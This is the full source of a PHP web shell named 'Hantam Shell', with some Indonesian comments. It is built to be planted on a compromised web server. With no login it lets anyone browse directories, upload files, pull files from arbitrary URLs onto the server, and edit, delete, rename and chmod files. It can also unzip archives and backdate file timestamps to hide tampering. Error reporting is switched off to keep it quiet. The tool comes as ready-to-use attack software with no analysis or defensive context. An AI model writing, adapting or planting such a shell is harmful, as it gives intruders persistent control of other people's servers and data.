<?php
error_reporting(0);

if (isset($_GET['cd']) && is_dir($_GET['cd'])) {
    chdir($_GET['cd']);
}
$currentDir = getcwd();

if (isset($_POST['do_upload']) && isset($_FILES['upload_file'])) {
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['name']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['do_url_upload']) && isset($_POST['upload_url'])) {
    $url = $_POST['upload_url'];
    $name = basename(parse_url($url, PHP_URL_PATH));
    file_put_contents($name, file_get_contents($url));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['rename_old'], $_POST['rename_new'])) {
    rename($_POST['rename_old'], $_POST['rename_new']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $fileToEdit = $_GET['edit'];
    if (isset($_POST['file_content'])) {
        file_put_contents($fileToEdit, $_POST['file_content']);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    $content = htmlspecialchars(file_get_contents($fileToEdit));
    echo "<h2>Editing: $fileToEdit</h2>";
    echo "<form method='post'><textarea name='file_content' rows='20' style='width:100%'>$content</textarea><br><button type='submit'>Save</button></form>";
    exit;
}
if (isset($_POST['chmod_target'], $_POST['chmod_value'])) {
    chmod($_POST['chmod_target'], octdec($_POST['chmod_value']));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['chdate_target'], $_POST['chdate_value'])) {
    touch($_POST['chdate_target'], strtotime($_POST['chdate_value']));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['create_file']) && $_POST['create_file_name']) {
    $newFile = $_POST['create_file_name'];
    if (!file_exists($newFile)) file_put_contents($newFile, '');
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['create_folder']) && $_POST['create_folder_name']) {
    $newFolder = $_POST['create_folder_name'];
    if (!file_exists($newFolder)) mkdir($newFolder);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_GET['unzip'])) {
    $zipFile = $_GET['unzip'];
    if (file_exists($zipFile) && preg_match('/\.zip$/i', $zipFile)) {
        $zip = new ZipArchive;
        if ($zip->open($zipFile) === TRUE) {
            $extractPath = pathinfo($zipFile, PATHINFO_FILENAME);
            if (!is_dir($extractPath)) mkdir($extractPath);
            $zip->extractTo($extractPath);
            $zip->close();
        }
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
<!-- STYLE OMITTED TO SAVE SPACE. Sama seperti versi sebelumnya. -->
<!-- Gunakan <style> yang sama dari versi dengan password jika ingin tampilan gelap. -->

<h2>♝Hantam Shell</h2>
<?php
echo "<div class='breadcrumb'>📁 Dir: ";
$parts = explode(DIRECTORY_SEPARATOR, $currentDir);
$path = "";
foreach ($parts as $part) {
    if ($part === "") continue;
    $path .= "/" . $part;
    echo "<a href='?cd=" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>";
}
echo "</div>";

echo <<<TOOLS
<div class="top-tools">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload_file">
        <button type="submit" name="do_upload">Upload</button>
    </form>
    <form method="post">
        <input type="text" name="upload_url" placeholder="URL file">
        <button type="submit" name="do_url_upload">Upload From URL</button>
    </form>
    <form method="post">
        <input type="text" name="create_file_name" placeholder="Nama File">
        <button type="submit" name="create_file">Create File</button>
    </form>
    <form method="post">
        <input type="text" name="create_folder_name" placeholder="Nama Folder">
        <button type="submit" name="create_folder">Create Folder</button>
    </form>
</div>
TOOLS;

echo "<table>
    <thead><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>";

echo "<tr><td>📁 <a href='?cd=" . urlencode(dirname($currentDir)) . "'>..</a></td>
<td>-</td>
<td>" . date("F d Y H:i:s", filemtime("..")) . "</td>
<td>" . substr(sprintf('%o', fileperms("..")), -4) . "</td>
<td><a href='?cd=" . urlencode(dirname($currentDir)) . "'>Select</a></td></tr>";

$folders = [];
$files = [];
foreach (scandir('.') as $file) {
    if ($file === ".") continue;
    if (is_dir($file)) $folders[] = $file;
    else $files[] = $file;
}
sort($folders);
sort($files);
$allItems = array_merge($folders, $files);

foreach ($allItems as $file) {
    $isDir = is_dir($file);
    $size = $isDir ? '-' : formatSize(filesize($file));
    $mtime = date("F d Y H:i:s", filemtime($file));
    $perms = substr(sprintf('%o', fileperms($file)), -4);
    $icon = $isDir ? '📁' : (preg_match('/\\.php$/i', $file) ? '🐘' :
             (preg_match('/\\.html?$/i', $file) ? '🌐' :
             (preg_match('/\\.txt$/i', $file) ? '📄' : '📦')));
    $nameDisplay = "$icon " . ($isDir ? "<a href='?cd=" . urlencode($file) . "'>$file</a>" : $file);
    echo "<tr>
        <td>$nameDisplay</td>
        <td>$size</td>
        <td>$mtime</td>
        <td>$perms</td>
        <td>
            <details><summary>Select</summary>
                <a href='?edit=" . urlencode($file) . "'>Edit</a><br>
                <form method='post'>
                    <input type='hidden' name='rename_old' value='$file'>
                    <input type='text' name='rename_new' value='$file' size='10'>
                    <button type='submit'>Rename</button>
                </form><br>
                <form method='post'>
                    <input type='hidden' name='chmod_target' value='$file'>
                    <input type='text' name='chmod_value' size='4' placeholder='0644'>
                    <button type='submit'>CHMOD</button>
                </form><br>
                <form method='post'>
                    <input type='hidden' name='chdate_target' value='$file'>
                    <input type='text' name='chdate_value' size='16' placeholder='2025-07-20 13:00'>
                    <button type='submit'>ChDate</button>
                </form><br>
                <a href='?del=" . urlencode($file) . "' onclick=\"return confirm('Hapus $file?');\">Delete</a><br>";
    if (!$isDir) echo "<a href='$file' download>Download</a><br>";
    if (!$isDir && preg_match('/\\.zip$/i', $file)) echo "<a href='?unzip=" . urlencode($file) . "'>Unzip</a>";
    echo "</details></td></tr>";
}
echo "</tbody></table>";

echo "<div style='text-align:center;margin-top:30px;font-size:13px;color:#888;'>
    2025 © Hantam Shell | Created By Njun.
</div>";

function formatSize($bytes) {
    $sizes = array('B','KB','MB','GB','TB');
    $i = 0;
    while ($bytes >= 1024 && $i < count($sizes)-1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes,2) . ' ' . $sizes[$i];
}
?>
